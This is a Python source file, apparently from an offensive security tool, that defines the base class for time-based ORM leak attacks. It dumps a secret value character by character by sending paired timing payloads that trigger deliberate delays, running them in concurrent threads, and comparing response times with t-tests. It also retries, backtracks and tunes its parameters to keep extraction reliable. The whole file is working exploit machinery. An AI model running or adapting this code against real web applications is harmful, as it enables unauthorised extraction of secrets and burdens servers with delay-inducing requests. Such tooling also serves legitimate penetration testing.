import math, random

from tqdm import tqdm
from typing import Optional
from scipy.stats import ttest_ind_from_stats
import numpy as np
from abc import ABC, abstractmethod
from colorama import Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor

from plormber.attacks.base import BaseORMLeakAttack, ORMLeakResult, ORMLeakTest
from plormber.attacks.time.exceptions import CouldNotFitParameters, MaxRetriesReached
from plormber.utils.strings import strip_empty_str_from_list
from plormber.utils.lists import remove_duped_entries
from plormber.utils.pandas import get_stats_df, ormleak_result_to_df


class BaseTimeORMLeakAttack(BaseORMLeakAttack, ABC):


    def __init__(self, trials: int = 10, significance_level: float = 0.1, max_trials: int = 100, retries: int = 5, verbose_stats: bool = False, 
                 do_trials_search: bool = False, trials_multiplier: float = 1.5, **kwargs):
        super().__init__(**kwargs)

        self.significance_level = significance_level
        self.trials = trials
        self.max_trials = max_trials
        self.current_threads = self.threads
        self.retries = retries
        self.not_highest_mean = True
        self.verbose_stats = verbose_stats
        self.do_trials_search = do_trials_search
        self.trials_multiplier = trials_multiplier


    def print_fail_msg(self, msg: str):
        print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}FAILED: {msg}{Style.RESET_ALL}")
        print("This occurs when a hit cannot be discerned by analysing processing times")
        print()
        print("Tweak the following settings to try and get it to work:")
        print()
    

    def build_payloads(self, known_dump: str) -> list[list[ORMLeakTest]]:
        tests: list[list[ORMLeakTest]] = []

        c_tests = []
        # Need to do pairwise comparisons hence why the different implementation and
        # return in comparison to base class
        chars_list = list(self.chars)
        if len(chars_list) % 2  == 1:
            char_1 = chars_list[-1]
            chars_list = chars_list[:-1]
            char_2 = random.choice(chars_list)
            for _t in range(self.trials):
                dump_1 = known_dump + char_1
                payload_1 = self.create_payload(dump_1)
                c_tests.append(ORMLeakTest(dump_1, payload_1))
                dump_2 = known_dump + char_2
                payload_2 = self.create_payload(dump_2)
                c_tests.append(ORMLeakTest(dump_2, payload_2))
            tests.append(c_tests)

        c_tests = []
        random.shuffle(chars_list) # DevSkim: ignore DS148264
        for i, c in enumerate(chars_list):
            if i % 2 == 0:
                c_tests = []
            for _t in range(self.trials):
                # Might need to change this if contains operator only allowed
                test_dump_val = known_dump+c
                payload = self.create_payload(test_dump_val)
                c_tests.append(ORMLeakTest(test_dump_val, payload))

            if i % 2 == 1:
                tests.append(c_tests)

        return tests
    

    def create_payload(self, test_value: str) -> list|dict|str:
        return self.add_orm_leak_payload(self.build_dos_payload(), test_value)
    

    def get_p_value_and_best_result(self, results: list[ORMLeakResult], use_highest_mean: bool = False) -> tuple[float, ORMLeakResult]:
        results_df = ormleak_result_to_df(results)
        stats_df = get_stats_df(results_df)
        hit_test_val = stats_df['mean'].idxmax()
        miss_test_val = stats_df['mean'].idxmin()
        hit_series = stats_df.loc[hit_test_val]
        hit_result = hit_series['result']
        hit_mean, hit_std, hit_size = hit_series['mean'], hit_series['std'], hit_series['size']
        # Trial size was too small to do hypothesis testing
        # Just return the result with the highest mean
        if np.isnan(hit_std) or use_highest_mean:
            if self.verbose_stats:
                print(f"{Style.DIM}{Fore.WHITE}stats analysis comparing {Fore.GREEN}{hit_test_val}{Fore.WHITE} to {Fore.RED}{miss_test_val}{Style.RESET_ALL}")
                print(f"{Style.DIM}", end='')
                print(stats_df.drop(columns=['result', 'std']))
                print(f"{Style.RESET_ALL}")
            return 0.0, hit_result
        miss_df = results_df.drop(results_df.loc[results_df['test_dump_val']==hit_test_val].index)
        miss_df['test_dump_val'] = 'miss'
        miss_stats_df = get_stats_df(miss_df)
        miss_series = miss_stats_df.loc['miss']
        miss_mean, miss_std, miss_size = miss_series['mean'], miss_series['std'], miss_series['size']
        _statistic, p_value = ttest_ind_from_stats(
            hit_mean, hit_std, hit_size,
            miss_mean, miss_std, miss_size,
            equal_var=False,
            alternative='greater'
        )
        if self.verbose_stats:
            print(f"{Style.DIM}{Fore.WHITE}stats analysis comparing {Fore.GREEN}{hit_test_val}{Fore.WHITE} to {Fore.RED}{miss_test_val}{Style.RESET_ALL}")
            print(f"{Style.DIM}", end='')
            print(stats_df.drop(columns=['result']))
            print(f"{Style.DIM}{Fore.WHITE}p_value for {Fore.GREEN}{hit_test_val}{Fore.WHITE}: {Fore.GREEN}{p_value}{Fore.WHITE}{Style.RESET_ALL}")
            print()
        return p_value, hit_result
    

    def determine_hit(self, results: list[ORMLeakResult], use_highest_mean: bool = False) -> Optional[ORMLeakResult]:
        p_value, hit_result = self.get_p_value_and_best_result(results, use_highest_mean=use_highest_mean)
        return hit_result if p_value < self.significance_level else None


    def _get_next_tests(self, prev_dump_strs: list[str]) -> list[list[ORMLeakTest]]:
        prev_dump_strs = remove_duped_entries(prev_dump_strs)
        
        trials = self.trials
        random.shuffle(prev_dump_strs) # DevSkim: ignore DS148264
        next_tests: list[list[ORMLeakTest]] = []

        if len(prev_dump_strs) % 2 == 1:
            last_test = prev_dump_strs[-1]
            prev_dump_strs = prev_dump_strs[:-1]
            other_test: str = random.choice(prev_dump_strs)
            pairwise_trials = [
                ORMLeakTest(
                    last_test,
                    self.create_payload(last_test),
                ) for _i in range(trials)
            ]
            pairwise_trials.extend([
                ORMLeakTest(
                    other_test,
                    self.create_payload(other_test),
                ) for _i in range(trials)
            ])
            next_tests.append(pairwise_trials)

        for i in range(0, len(prev_dump_strs), 2):
            test_1 = prev_dump_strs[i]
            test_2 = prev_dump_strs[i+1]
            pairwise_trials = [
                ORMLeakTest(
                    test_1,
                    self.create_payload(test_1),
                ) for _i in range(trials)
            ]
            pairwise_trials.extend([
                ORMLeakTest(
                    test_2,
                    self.create_payload(test_2),
                ) for _i in range(trials)
            ])
            next_tests.append(pairwise_trials)

        return next_tests


    def _exploit_tournament(self, p_results: list[ORMLeakResult]|list[str]) -> Optional[ORMLeakResult]:
        assert len(p_results) > 0, 'p_results > 0 needs to be True'

        if isinstance(p_results[0], ORMLeakResult):
            p_results: list[str] = [
                r.test.dump_val
                for r in p_results
            ]

        p_results = remove_duped_entries(p_results)        

        if len(p_results) == 1:
            # Janky fix but only the dump value is used after this point
            return ORMLeakResult(ORMLeakTest(p_results[0], ''), 0.0, None)
        
        next_tests = self._get_next_tests(p_results)
        results = self.fire_sol_cannon(next_tests)
        hit_results = []

        for pairwise_results in results:
            hit_result = self.determine_hit(pairwise_results, use_highest_mean=not self.not_highest_mean)
            if hit_result is not None:
                hit_results.append(hit_result)

        hit_len = len(hit_results)

        if hit_len > 1:
            return self._exploit_tournament(hit_results)
        
        return hit_results[0] if hit_len == 1 else None


    def _exploit_run(self, known_dump_val: str) -> Optional[ORMLeakResult]:
        results = self.prepare_and_fire_sol_cannon(known_dump_val)
        remaining_tests = []
        for pairwise_results in results:
            hit_result = self.determine_hit(pairwise_results, use_highest_mean=not self.not_highest_mean)
            if hit_result is not None:
                remaining_tests.append(hit_result)

        remaining_len = len(remaining_tests)
        final_result: Optional[ORMLeakResult] = None
        if remaining_len > 1:
            final_result = self._exploit_tournament(remaining_tests)
        elif remaining_len == 1:
            final_result = remaining_tests[0]
        return final_result
    

    def check_is_significant(self, dump_val: str) -> tuple[float, bool, list[ORMLeakResult]]:
        control_var = ''.join(random.choices(self.chars, k=len(dump_val)))
        tests = self._get_next_tests([dump_val, control_var])

        # Only one pairwise comparison occurred
        results = self.fire_sol_cannon(tests)[0]
        p_value, hit_result = self.get_p_value_and_best_result(results)
        # It was so bad we are just going to fail it and set the p_value to 1 to signal H_0 should not be rejected
        if hit_result.test.dump_val != dump_val:
            return 1, False, results
        
        reject_null = p_value < self.significance_level
        return p_value, reject_null, results
    

    def _correct_path(self, dump_vals: list[str], retry_count: int = 0) -> list[str]:
        """
        Attempts to detect and correct any errors that could be made while dumping characters:

        Process:
            1. go through each dump_val in dump_vals that have been dumped and create a control variable that is known to be incorrect.
            2. calculate the p_values and check they are all statistically significant
            3. if there is not a continuous chain, adjust self.trials and self.significance_level and repeat step 1-2
            4. if there is still not a consistent chain after repeating step 3 self.retries time, return the longest continuous chain
        """
        assert len(dump_vals) > 1, 'dump_vals length needs to be greater than 1'
        
        if retry_count > self.retries:
            raise MaxRetriesReached('increase --retries')
        
        def broken_chain_call():
            self.trials = math.ceil(self.trials * self.trials_multiplier)
            if self.trials >= self.max_trials:
                raise CouldNotFitParameters('increase --max-trials')
            result =  self._correct_path(dump_vals, retry_count=retry_count+1)
            print(f"{Fore.WHITE}Identified error and adjusted {Fore.CYAN}--trials{Fore.WHITE}: {Fore.GREEN}{self.trials}{Style.RESET_ALL}")
            return result
        
        sig_vals: list[bool] = []
        p_values: list[float] = []
        for prev_dump in dump_vals:
            p_value, reject_null, _results = self.check_is_significant(prev_dump)
            p_values.append(p_value)
            if not reject_null:
                print(f"{Style.DIM}{Fore.GREEN}{prev_dump}{Fore.WHITE} is not statistically significant!{Style.RESET_ALL}")
            
            sig_vals.append(reject_null)

        # Completely goofed up
        if sum(sig_vals) == 0:
            return []

        prev_hit = sig_vals[0]
        broken_chain = False
        likely_chain: list[str] = [dump_vals[0]]

        if not prev_hit:
            return broken_chain_call()

        for next_hit, dump_val in zip(sig_vals[1:], dump_vals[1:]):
            if not prev_hit and next_hit:
                broken_chain = True
                break
            if next_hit:
                likely_chain.append(dump_val)
            prev_hit = next_hit

        # if broken chain then it means either a statistical anomaly occurred or something very goofed
        # try changing trials and significance level
        if broken_chain:
            return broken_chain_call()

        if retry_count == 0 and self.verbose_stats:
            print(f"{Fore.GREEN}Path check detected no errors! Continuing exploitation.{Style.RESET_ALL}")

            # If the mean p value is less than 5% of the intended significance level then we could drop the number of trials
            # This is to mitigate against the issue of the number of trial always increasing that is just caused due to error.
            if np.mean(p_values) < self.significance_level * 0.05:
                self.trials = math.ceil(self.trials * 0.75)
                print(f"{Fore.GREEN}Dropping number of trials to {Fore.CYAN}--trials {self.trials}{Style.RESET_ALL}")
        
        return strip_empty_str_from_list(likely_chain)
    

    def fire_sol_cannon(self, tests: list[list[ORMLeakTest]]) -> list[list[ORMLeakResult]]:
        """
            A really silly name after the SOL cannon from Akira...

            What it does is just starts sending the requests.

            Args:
                tests: a list of pairwise comparison tests to perform

            Returns:
                A list of the results for each pairwise comparison test
        """
        results: list[list[ORMLeakResult]] = []

        enum_list = tqdm(tests) if self.verbose_stats else tests
        for test in enum_list:
            random.shuffle(test) # DevSkim: ignore DS148264
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = executor.map(self.send_payload, test)
                results.append(list(futures))
                executor.shutdown(wait=True, cancel_futures=False)
           
        return results


    def prepare_and_fire_sol_cannon(self, known_dump_val: str) -> list[list[ORMLeakResult]]:
        """
            Prepares then fires sending off the pairwise comparisons to determine a hit

            Args:
                known_dump_val: the known dump value

            Returns:
                a list of the pairwise comparisons for testing two characters
        """
        payloads: list[list[ORMLeakTest]] = self.build_payloads(known_dump_val)
        return self.fire_sol_cannon(payloads)


    def fit_params(self):
        """
            Finds a suitable set of parameters for exploiting a time-based ORM leak vulnerability

            Raises:
                CouldNotFitParameters: if parameters could not been found that identify hits
        """
        if self.do_trials_search:
            self.trials_search()
            print(f"{Fore.GREEN}Fitted {Fore.CYAN}--trials{Style.RESET_ALL} {Fore.YELLOW}{Style.BRIGHT}{self.trials}{Style.RESET_ALL}")
            print()


    def pre_checks(self) -> bool:
        try:
            self.fit_params()
        except CouldNotFitParameters:
            self.print_fail_msg('Could not fit parameters successfully!')
            return False
        except Exception as e:
            self.print_fail_msg(e)
            return False
        return True


    def exploit(self) -> str:
        if not self.pre_checks():
            print(f"{Back.RED}{Style.BRIGHT}Pre-checks have failed! Stopping now{Style.RESET_ALL}")
            return ''
        
        known_dump_val = self.dumped_prefix
        prev_dump_vals: list[str] = []
        retries = 0
        while True:
            final_result = self._exploit_run(known_dump_val)
            if final_result is None and retries < self.retries:
                print(f"{Back.YELLOW}{Fore.BLACK}WARNING: Failed to determine next character!{Style.RESET_ALL}")
                self.trials = math.ceil(self.trials * self.trials_multiplier)
                print(f"{Style.DIM}{Fore.YELLOW}Error detected and set {Fore.CYAN}--trials {Fore.GREEN}{self.trials}{Fore.WHITE}. Repeating exploitation attempt{Style.RESET_ALL}")
                retries += 1
                continue
            elif retries >= self.retries:
                self.print_fail_msg(f"Could not determine next character in {self.retries} retries!")
                print(f"{Back.GREEN}{Fore.WHITE}{Style.BRIGHT}Could be due to full value being dumped or the endpoint is not vulnerable{Style.RESET_ALL}")
                break

            hit_val = final_result.test.dump_val
            _p_value, reject_null, _results = self.check_is_significant(hit_val)
            if not reject_null:
                self.trials = math.ceil(self.trials * self.trials_multiplier)
                print(f"{Style.DIM}{Fore.YELLOW}Error detected and set {Fore.CYAN}--trials {Fore.GREEN}{self.trials}{Fore.WHITE}. Repeating exploitation attempt{Style.RESET_ALL}")
                continue

            retries = 0
            if len(known_dump_val) != 0:
                prev_dump_vals.append(known_dump_val)
            
            known_dump_val = hit_val
            print(f"{Style.BRIGHT}{Fore.CYAN}dumped value: {Fore.GREEN}{Style.BRIGHT}{known_dump_val}{Style.RESET_ALL}")

            if len(prev_dump_vals) > 1:
                if self.verbose_stats:
                    print(f"{Style.DIM}Attempting to identify and correct any mistakes{Style.RESET_ALL}")
                d_vals = prev_dump_vals+[known_dump_val]
                d_vals_len = len(d_vals)
                dump_vals = self._correct_path(d_vals)
                # Reset after doing correct path check
                prev_dump_vals = []
                dump_vals_len = len(dump_vals)
                if dump_vals_len != d_vals_len:
                    known_dump_val = dump_vals[-1] if dump_vals_len > 0 else self.dumped_prefix
                    print(f"{Back.YELLOW}{Fore.BLACK}WARNING: Detected an error in dumped values!{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}{Style.BRIGHT}back tracked to: {Fore.GREEN}{known_dump_val}{Style.RESET_ALL}")


    def was_success_result(self, resp):
        """
            This method is not used for time based attacks

            Leave empty
        """
        pass


    @abstractmethod
    def trials_search(self):
        """
            Method for sending a known result and a control variable to find a suitable choice for self.trails for the corresponding self.significance_level

            Raises:
                CouldNotFitParameters: if a suitable choice of trials could not be determined
        """
        raise NotImplementedError


    @abstractmethod
    def build_dos_payload(self):
        """
            Method that creates a payload that would cause a time delay when a character hit occurs
        """
        raise NotImplementedError


    @abstractmethod
    def add_orm_leak_payload(self, payload, test_val):
        """
            Method for adding a test payload to the payload that would cause the time delay
        """
        raise NotImplementedError
    

    @classmethod
    def add_options(cls, parser):
        parser = super().add_options(parser)

        parser.add_argument(
            '--significance-level',
            help='the significance level',
            default=0.1,
            type=float
        )

        parser.add_argument(
            '--trials',
            help='the initial number of trials to test for each character',
            default=10,
            type=int
        )

        parser.add_argument(
            '--max-trials',
            help='the maximum number of trials/stats trials the program will approach when trying to correct parameters',
            default=200,
            type=int
        )

        parser.add_argument(
            '--retries',
            help='number of failed retries before giving up',
            default=2,
            type=int
        )

        parser.add_argument(
            '--verbose-stats',
            help='print statistical analysis',
            action='store_true'
        )

        parser.add_argument(
            '--do-trials-search',
            help='performs a search for a suitable configuration for --trials based on the --significance-level before exploitation',
            action='store_true'
        )

        parser.add_argument(
            '--trials-multiplier',
            help='multiplier that is applied to correct the --trials option when an error is detected',
            default=1.5,
            type=float
        )

        return parser
    
